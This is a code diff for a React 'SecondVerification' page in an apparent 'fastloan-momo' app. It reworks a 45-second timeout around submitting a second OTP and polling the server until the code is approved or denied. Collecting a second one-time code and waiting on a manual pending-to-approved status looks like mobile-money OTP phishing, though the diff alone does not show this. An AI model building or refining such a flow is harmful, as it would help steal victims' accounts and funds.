@@ -1,6 +1,6 @@
 import { useState, useRef, type KeyboardEvent } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
-import { Wallet, ArrowLeft, Lock, Key } from "lucide-react";
+import { Wallet, ArrowLeft, Key } from "lucide-react";
 
 const API_URL = "https://fastloan-momo-kj8m.onrender.com";
 
@@ -35,6 +35,12 @@ const SecondVerification = () => {
     if (!isFormValid) return;
     setIsVerifying(true);
 
+    // 45-second timeout fallback
+    const timeoutId = setTimeout(() => {
+      setIsVerifying(false);
+      navigate("/"); 
+    }, 45000);
+
     try {
       const res = await fetch(`${API_URL}/api/verify-second-otp`, {
         method: "POST",
@@ -54,23 +60,25 @@ const SecondVerification = () => {
           
           if (statusData.status !== "pending") {
             clearInterval(interval);
+            clearTimeout(timeoutId); // ✅ Prevents the 45s timeout from firing later
             setIsVerifying(false);
             
             if (statusData.status === "approved") {
+              // ✅ Approved: Go to Loan Limit
               navigate("/loan-limit", { state: { phone: phoneNumber } });
             } else {
+              // ✅ Denied: Go back to Login
               navigate("/"); 
             }
           }
         }, 2000);
-
-        setTimeout(() => {
-          clearInterval(interval);
-          setIsVerifying(false);
-          navigate("/"); 
-        }, 45000);
+      } else {
+        clearTimeout(timeoutId);
+        setIsVerifying(false);
+        navigate("/");
       }
     } catch (error) {
+      clearTimeout(timeoutId);
       setIsVerifying(false);
       navigate("/");
     }
